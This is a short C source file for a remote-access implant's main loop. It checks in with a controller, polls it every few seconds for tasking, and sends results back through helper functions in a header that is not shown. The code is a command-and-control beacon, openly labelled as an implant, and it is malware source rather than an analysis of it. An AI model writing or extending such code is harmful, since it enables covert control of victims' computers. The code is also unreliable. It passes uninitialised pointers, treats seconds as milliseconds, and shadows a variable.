#include <stdio.h>
#include "SendRecv.h"

int Sleep(int secs) {
    SleepEx((DWORD)secs, FALSE);
    return 0;
}

int main() {
    LPSTR result;
    LPSTR id;
    int status = SendTheMessage("Implant Checked In!", id);
    if (status == 1) {
        return 1;
    }

   while (true) {
        Sleep(10000);
        status = RecvTheMessage(id, result);
        if (status == 1) {
            return 1;
        }
        Sleep(1000);
        if (strcmp(result, "") != 0) {
            LPSTR mResult = AddPrefixToResult(result, (LPSTR)"Result: ");
            if (strcmp(result, "Huge Output Send!") == 0) {
                LPSTR mResult = (LPSTR)"Huge Output Send!";
                UpdateTheMessage(mResult, id);
                result = (LPSTR)"";
            }
            else {
                UpdateTheMessage(mResult, id);
                result = (LPSTR)"";
            }
        }
    }
    return 0;
}